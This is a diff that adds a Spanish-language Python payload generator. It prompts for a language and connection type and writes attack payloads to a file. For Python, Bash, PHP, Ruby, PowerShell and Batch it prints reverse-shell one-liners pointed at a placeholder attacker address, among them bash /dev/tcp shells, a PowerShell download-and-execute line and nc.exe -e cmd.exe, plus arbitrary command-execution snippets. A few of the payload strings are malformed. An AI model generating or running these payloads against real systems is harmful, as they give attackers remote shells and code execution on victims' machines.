@@ -1,0 +1,85 @@
+import subprocess
+import os
+
+def generar_payload_python(comando, tipo):
+    if tipo == 'reverse':
+        payload = f"import socket, subprocess; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('tu_ip', tu_puerto)); subprocess.run(['/bin/bash', '-c', 'exec 5<>/dev/tcp/tu_ip/tu_puerto;cat <&5 | while read line; do $line 2>&5 >&5; done']"
+    else:
+        payload = f"import subprocess; subprocess.run('{comando}', shell=True)"
+    return payload
+
+def generar_payload_bash(comando, tipo):
+    if tipo == 'reverse':
+        payload = f"bash -i >& /dev/tcp/tu_ip/tu_puerto 0>&1"
+    else:
+        payload = f"{comando}"
+    return payload
+
+def generar_payload_php(comando, tipo):
+    if tipo == 'reverse':
+        payload = f"<?php $sock=fsockopen('tu_ip', tu_puerto);exec('/bin/bash -c \"bash -i >%26 /dev/tcp/tu_ip/tu_puerto 0>%261\"'); ?>"
+    else:
+        payload = f"<?php system('{comando}'); ?>"
+    return payload
+
+def generar_payload_ruby(comando, tipo):
+    if tipo == 'reverse':
+        payload = f"system('bash -c \"bash -i >& /dev/tcp/tu_ip/tu_puerto 0>&1\"')"
+    else:
+        payload = f"system('{comando}')"
+    return payload
+
+def generar_payload_powershell(comando, tipo):
+    if tipo == 'reverse':
+        payload = f"IEX (New-Object Net.WebClient).DownloadString('http://tu_ip/tu_script.ps1');"
+    else:
+        payload = f"Invoke-Expression '{comando}'"
+    return payload
+
+def generar_payload_batch(comando, tipo):
+    if tipo == 'reverse':
+        payload = f"cmd.exe /c \"c:\\windows\\system32\\cmd.exe /k \\nc.exe -e cmd.exe tu_ip tu_puerto\""
+    else:
+        payload = f"@echo off\n{comando}"
+    return payload
+
+def guardar_payload_en_archivo(payload, nombre_archivo):
+    carpeta = "payloads"
+
+    try:
+        os.makedirs(carpeta, exist_ok=True)
+        ruta_archivo = os.path.join(carpeta, nombre_archivo)
+        with open(ruta_archivo, 'w') as archivo:
+            archivo.write(payload)
+
+        return ruta_archivo
+    except Exception as e:
+        return f"Error al guardar el archivo: {e}"
+
+# Solicitar al usuario el tipo de payload, comando y nombre del archivo
+tipo_payload = input("Ingresa el tipo de payload (python/bash/php/ruby/powershell/batch): ").lower()
+comando_deseado = input("Ingresa el comando deseado para el payload: ")
+nombre_archivo = input("Ingresa el nombre del archivo para guardar el payload: ")
+tipo_conexion = input("Ingresa el tipo de conexión (reverse/bind): ").lower()
+
+# Generar el payload según el tipo seleccionado y guardarlo en un archivo
+if tipo_payload == 'python':
+    nuevo_payload = generar_payload_python(comando_deseado, tipo_conexion)
+elif tipo_payload == 'bash':
+    nuevo_payload = generar_payload_bash(comando_deseado, tipo_conexion)
+elif tipo_payload == 'php':
+    nuevo_payload = generar_payload_php(comando_deseado, tipo_conexion)
+elif tipo_payload == 'ruby':
+    nuevo_payload = generar_payload_ruby(comando_deseado, tipo_conexion)
+elif tipo_payload == 'powershell':
+    nuevo_payload = generar_payload_powershell(comando_deseado, tipo_conexion)
+elif tipo_payload == 'batch':
+    nuevo_payload = generar_payload_batch(comando_deseado, tipo_conexion)
+else:
+    print("Tipo de payload no válido. Selecciona 'python', 'bash', 'php', 'ruby', 'powershell' o 'batch'.")
+    nuevo_payload = None
+
+# Si se generó un payload válido, guardarlo en un archivo
+if nuevo_payload:
+    ruta_archivo = guardar_payload_en_archivo(nuevo_payload, nombre_archivo)
+    print(f"\n{'Payload guardado en:' if not 'Error' in ruta_archivo else 'Error:'} {ruta_archivo}")
